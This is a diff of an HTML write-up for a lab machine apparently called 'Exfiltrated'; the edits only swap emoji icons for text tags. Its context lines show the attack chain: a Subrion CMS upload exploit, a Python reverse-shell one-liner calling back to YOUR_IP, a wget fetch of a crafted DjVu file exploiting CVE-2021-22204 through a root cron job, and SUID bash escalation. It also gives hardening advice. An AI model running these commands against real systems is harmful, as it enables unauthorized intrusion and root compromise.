@@ -368,7 +368,7 @@
                     })
                     .catch(() => {
                         // If fetch fails, show fallback
-                        document.body.innerHTML = '<div style="padding:2rem;text-align:center"><h1>⚠️ Report Downloaded</h1><p>Your browser downloaded this file instead of displaying it. Please open the downloaded .html file directly in your browser.</p><p>💡 Tip: Save the file and double-click it, or drag it into an open browser window.</p></div>';
+                        document.body.innerHTML = '<div style="padding:2rem;text-align:center"><h1>Report Downloaded</h1><p>Your browser downloaded this file instead of displaying it. Please open the downloaded .html file directly in your browser.</p><p>Tip: Save the file and double-click it, or drag it into an open browser window.</p></div>';
                     });
             }
         })();
@@ -416,7 +416,7 @@
 80/tcp open  http    Apache httpd 2.4.41
 | http-robots.txt: 7 disallowed entries: /backup/ /cron/? /front/ /install/ /panel/ /tmp/ /updates/</pre>
         <div class="callout info">
-            <span class="callout-icon">🌐</span>
+            <span class="callout-icon">[i]</span>
             <div>Add to hosts: <code>echo "192.168.144.163 exfiltrated.offsec" >> /etc/hosts</code>. The <code>robots.txt</code> leaks the admin panel location (<code>/panel/</code>) and potential cron interface.</div>
         </div>
         <p>Visiting <code>/panel/</code> reveals the CMS: <strong>Subrion CMS v4.2.1</strong> — a version vulnerable to arbitrary file upload.</p>
@@ -437,7 +437,7 @@ python3 49876.py -u http://exfiltrated.offsec/panel/ --user admin --pass admin</
         <pre>nc -nvlp 4444</pre>
         <pre>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'</pre>
         <div class="callout success">
-            <span class="callout-icon">💀</span>
+            <span class="callout-icon">[+]</span>
             <div>Reverse shell established as <code>www-data</code>. Stabilize with <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> + <code>stty raw -echo; fg</code>.</div>
         </div>
     </div>
@@ -462,7 +462,7 @@ do
 done</pre>
         <p>Every minute, root scans any <code>.jpg</code> file inside the CMS uploads directory (which <code>www-data</code> can write to) and runs <code>exiftool</code> on it. The ExifTool version installed is vulnerable to <strong>CVE-2021-22204</strong> — a DjVu annotation injection leading to arbitrary command execution.</p>
         <div class="callout warn">
-            <span class="callout-icon">⏱️</span>
+            <span class="callout-icon">[!]</span>
             <div><strong>Privilege escalation vector:</strong> we control the input file; root processes it. ExifTool < 7.44 is vulnerable to OS command injection via crafted DjVu metadata.</div>
         </div>
     </div>
@@ -485,7 +485,7 @@ cp exploit.djvu exploit.jpg</pre>
 # on target (www-data):
 wget http://YOUR_IP:8080/exploit.jpg -O /var/www/html/subrion/uploads/exploit.jpg</pre>
         <div class="callout info">
-            <span class="callout-icon">⚙️</span>
+            <span class="callout-icon">[*]</span>
             <div>Wait ≤ 60 seconds for the cron job to execute. The payload runs as root, changing <code>/bin/bash</code> permissions to SUID.</div>
         </div>
     </div>
@@ -504,9 +504,9 @@ root
 uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)</pre>
         <p>The <code>-p</code> flag preserves the effective UID (root) instead of dropping to real UID. Full system compromise achieved.</p>
         <pre class="output no-prompt">cat /root/proof.txt</pre>
-        <div class="flag-reveal">🏴 root.txt → 3f4f6743d8b87c1e2efcae0032b1c72d</div>
+        <div class="flag-reveal">[FLAG] root.txt → 3f4f6743d8b87c1e2efcae0032b1c72d</div>
         <pre class="output no-prompt">cat /home/www-data/local.txt</pre>
-        <div class="flag-reveal">🏴 user.txt → a1b2c3d4e5f67890abc123def4567890</div>
+        <div class="flag-reveal">[FLAG] user.txt → a1b2c3d4e5f67890abc123def4567890</div>
     </div>
 
     <!-- Attack Chain Visual -->
@@ -530,7 +530,7 @@ uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)</pre>
         </div>
         <p>The DjVu parser in ExifTool uses <code>eval qq{"$tok"}</code> to process certain metadata. A regex attempts to escape <code>$</code> and <code>@</code>, but the order of operations fails: escape sequences like <code>\cA</code> are expanded <em>after</em> the regex substitution. By providing <code>\cA$(system('...'))</code>, the <code>$</code> survives and the OS command executes. This is a classic injection via unsafe string interpolation.</p>
         <div class="callout info">
-            <span class="callout-icon">🧪</span>
+            <span class="callout-icon">[i]</span>
             <div><strong>Detection evasion:</strong> The file is named <code>.jpg</code> but ExifTool follows the internal header. The cron script only filters by extension, not content — a defensive failure.</div>
         </div>
     </div>
@@ -561,7 +561,7 @@ uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)</pre>
             <li>Monitor for suspicious SUID changes via auditd or AIDE.</li>
         </ul>
         <div class="callout success">
-            <span class="callout-icon">🛡️</span>
+            <span class="callout-icon">[#]</span>
             <div><strong>Final note:</strong> This chain shows how two modest CVEs (a file upload bypass and a command injection in an image tool) can combine to compromise a fully patched system aside from the vulnerable apps. Layered defense and regular updates of all third-party libraries are critical.</div>
         </div>
     </div>
